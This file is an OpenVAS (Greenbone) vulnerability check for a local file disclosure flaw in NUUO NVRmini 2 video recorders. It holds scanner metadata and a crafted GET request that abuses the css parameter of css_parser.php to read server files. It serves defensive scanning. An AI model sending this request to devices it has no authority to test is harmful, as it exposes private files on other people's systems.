###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nuuo_nvrmini_loc_fil_dic.nasl 3894 2016-08-26 09:56:27Z teissa $
#
# NUUO NVRmini 2 3.0.8 - Local File Disclosure Vulnerability
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:nuuo:nuuo';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107043");
  script_version("$Revision: 3894 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-08-26 11:56:27 +0200 (Fri, 26 Aug 2016) $");
  script_tag(name:"creation_date", value:"2016-08-24 16:42:51 +0200 (Wed, 24 Aug 2016)");
  script_name("NUUO NVRmini 2 3.0.8 - Local File Disclosure Vulnerability");

  tag_vuldetect ="This check tries to disclose a local file content by sending a crafted HTTP GET request";

  tag_insight = "Due to improper verification of input passed through the css parameter to css_parser.php script ";

  tag_impact =
  "Successful exploitation will allow remote attackers to disclose contents of files.";

  tag_affected =
  "Versions 2.3.0.8 and below";

  tag_solution =
  "For updates refer to http://www.nuuo.com ";

  script_tag(name : "summary" , value : "This host is running NUUO NVRmini and is affected by a local file disclosure vulnerability.");
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);
  script_xref(name : "URL" , value : ":https://cxsecurity.com/issue/WLB-2016080065");
  script_category(ACT_ATTACK);
  script_tag(name:"solution_type", value: "VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_nuuo_devices_web_detect.nasl");
  script_require_ports("Services/www", 80, 443);
  script_mandatory_keys("nuuo/web/detected");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
dir = "";
url = "";
http_port = "";
if(!http_port = get_app_port(cpe:CPE, service:'www' )) exit(0);

if(!dir = get_app_location(cpe:CPE, port:http_port))  exit(0);

url = dir  + 'css_parser.php?css=css_parser.php'; 
if ( http_vuln_check( port:http_port, url:url, check_header:TRUE, 
  pattern:"<\?php", extra_check: '/* please use an absolute address for your css /*' )) 
{
   report = '\nIt was possible to disclose the content of css_parser.php file \n';
   report += report_vuln_url( port:http_port, url:url );
   security_message( port:http_port, data:report );
   exit( 0 );
}
